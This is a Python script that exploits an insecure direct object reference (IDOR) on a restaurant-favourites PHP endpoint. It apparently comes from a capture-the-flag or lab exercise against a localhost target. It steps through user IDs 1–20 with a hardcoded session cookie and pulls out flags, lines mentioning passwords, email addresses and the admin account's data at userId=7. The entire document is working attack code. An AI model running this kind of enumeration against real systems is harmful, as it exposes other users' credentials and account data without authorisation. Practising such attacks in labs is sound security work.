import requests
import re
import json
import time

# Configuration
base_url = "http://127.0.0.1:33156"
endpoint = "/api/get_favorite_restaurants.php"
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
}
cookies = {
    "PHPSESSID": "j2jbue9ik42nla625rupl7v2jk"
}

print("IDOR Vulnerability Enumeration")
print("Target: /api/get_favorite_restaurants.php")
print("Testing userId values: 1-20")
print()

# Results storage
flags_found = []
password_info = []
admin_data = None
successful_ids = []

# Test userId values 1-20
for user_id in range(1, 21):
    print(f"\n[>] Testing userId: {user_id}")
    url = f"{base_url}{endpoint}?userId={user_id}"
    
    try:
        response = requests.get(url, headers=headers, cookies=cookies, timeout=10)
        print(f"  Status: {response.status_code}")
        print(f"  Length: {len(response.text)} bytes")
        
        if response.status_code == 200:
            successful_ids.append(user_id)
            response_text = response.text
            
            # Check for flags
            flag_match = re.search(r'FLAG\{[^}]+\}', response_text)
            if flag_match:
                flag = flag_match.group()
                flags_found.append((user_id, flag))
                print(f"  [!] FLAG FOUND: {flag}")          
            
            # Look for password-related information (case-insensitive)
            if re.search(r'password', response_text, re.I):
                # Extract context around password
                lines = response_text.split('\n')
                for line in lines:
                    if 'password' in line.lower():
                        password_info.append((user_id, line.strip()))
                        print(f"  [!] PASSWORD INFO: {line.strip()}")
            
            # Special handling for admin account (userId=7)
            if user_id == 7:
                admin_data = response_text
                print(f"  [+] Admin account data retrieved!")
                print(f"  Response: {response_text[:300]}")
            else:
                print(f"  Response: {response_text[:200]}")
        else:
            print(f"  [✗] No data (status {response.status_code})")
            
    except requests.exceptions.Timeout:
        print(f"  [✗] Timeout")
    except Exception as e:
        print(f"  [✗] Error: {str(e)}")
    
    # Small delay to avoid overwhelming the server
    time.sleep(0.1)

# Summary
print("\n" + "="*60)
print("ENUMERATION SUMMARY")
print("="*60)
print(f"Successful requests: {len(successful_ids)} (IDs: {successful_ids})")

if flags_found:
    print("\n[!] FLAGS DISCOVERED:")
    for user_id, flag in flags_found:
        print(f"  userId={user_id}: {flag}")

if password_info:
    print("\n[!] PASSWORD INFORMATION:")
    for user_id, info in password_info:
        print(f"  userId={user_id}: {info}")

if admin_data:
    print("\n[!] ADMIN ACCOUNT (userId=7) DETAILS:")
    print(f"  Full response: {admin_data}")
    
    # Deep analysis of admin data
    print("\n  Detailed analysis:")
    if re.search(r'password', admin_data, re.I):
        print("  - Contains password information")
    if '@' in admin_data:
        emails = re.findall(r'\S+@\S+', admin_data)
        print(f"  - Email(s) found: {emails}")
    if 'admin' in admin_data.lower():
        print("  - Admin references present")

print("\n" + "="*60)
print("Enumeration Complete")
print("="*60)
